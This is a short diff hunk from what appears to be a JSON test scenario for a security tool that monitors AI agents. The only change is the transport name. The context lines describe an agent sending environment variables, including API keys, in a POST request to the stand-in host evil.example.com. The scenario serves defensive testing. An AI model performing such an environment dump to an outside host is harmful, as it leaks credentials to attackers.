@@ -5,7 +5,7 @@
   "title": "Environment variable dump containing secrets",
   "description": "Agent dumps environment variables including API keys in a POST body.",
   "input_type": "request_body",
-  "transport": "fetch_proxy",
+  "transport": "http_proxy",
   "payload": {
     "method": "POST",
     "url": "https://evil.example.com/debug/env",
